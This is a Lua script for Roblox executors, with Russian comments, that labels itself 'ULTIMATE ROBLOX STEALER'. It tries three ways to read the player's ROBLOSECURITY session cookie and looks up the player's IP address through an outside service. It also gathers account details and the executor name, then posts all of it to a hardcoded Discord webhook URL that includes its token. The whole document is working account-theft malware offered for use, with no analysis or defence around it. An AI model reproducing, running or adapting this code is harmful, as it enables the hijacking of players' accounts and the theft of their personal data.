local webhook = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0Cy_WeR0dfOaLyocTQGAEH-KuK6F54lvIir0T3NGoVD0Nfpe0LUIGpScfoxj"

local request = (syn and syn.request) or http_request or (http and http.request)
if not request then return end

-- Сбор всей возможной информации
local data = {}
local player = game.Players.LocalPlayer

-- 1. Попытка получить куки через разные методы
local cookies = {}
pcall(function()
    -- Метод 1: Через HTTP запрос
    cookies.method1 = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx")
end)

pcall(function()
    -- Метод 2: Через атрибуты игрока
    cookies.method2 = player:GetAttribute("ROBLOSECURITY")
end)

pcall(function()
    -- Метод 3: Через сервис аутентификации
    cookies.method3 = game:GetService("AuthenticationService"):GetCookie("ROBLOSECURITY")
end)

-- 2. Получение IP
local ip = "unknown"
pcall(function()
    ip = game:HttpGet("http://api.ipify.org")
end)

-- 3. Информация об аккаунте
local accountInfo = {
    name = player.Name,
    userId = player.UserId,
    accountAge = player.AccountAge or "unknown",
    membership = (player.MembershipType == Enum.MembershipType.Premium) and "Premium" or "Normal"
}

-- 4. Информация об исполнителе
local executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or "Unknown"

-- Формирование сообщения
local message = "🔴 **ULTIMATE ROBLOX STEALER** 🔴\n\n"
message = message .. "👤 **Account Info:**\n"
message = message .. "Name: " .. accountInfo.name .. "\n"
message = message .. "UserID: " .. accountInfo.userId .. "\n"
message = message .. "Account Age: " .. accountInfo.accountAge .. " days\n"
message = message .. "Membership: " .. accountInfo.membership .. "\n\n"

message = message .. "🌐 **Network Info:**\n"
message = message .. "IP: " .. ip .. "\n\n"

message = message .. "💻 **Client Info:**\n"
message = message .. "Executor: " .. executor .. "\n\n"

message = message .. "🔐 **Cookie Attempts:**\n"
message = message .. "Method 1: " .. (cookies.method1 and "SUCCESS" or "FAILED") .. "\n"
message = message .. "Method 2: " .. (cookies.method2 and "SUCCESS" or "FAILED") .. "\n"
message = message .. "Method 3: " .. (cookies.method3 and "SUCCESS" or "FAILED") .. "\n\n"

if cookies.method1 and #cookies.method1 > 10 then
    message = message .. "**COOKIE FOUND:** ||" .. cookies.method1 .. "||\n"
end

message = message .. "🕒 Time: " .. os.date("%Y-%m-%d %H:%M:%S")

-- Отправка
request({
    Url = webhook,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode({
        content = message,
        username = "Ultimate Stealer",
        avatar_url = "https://i.imgur.com/7W6hQ3d.png"
    })
})

print("Data collection complete")
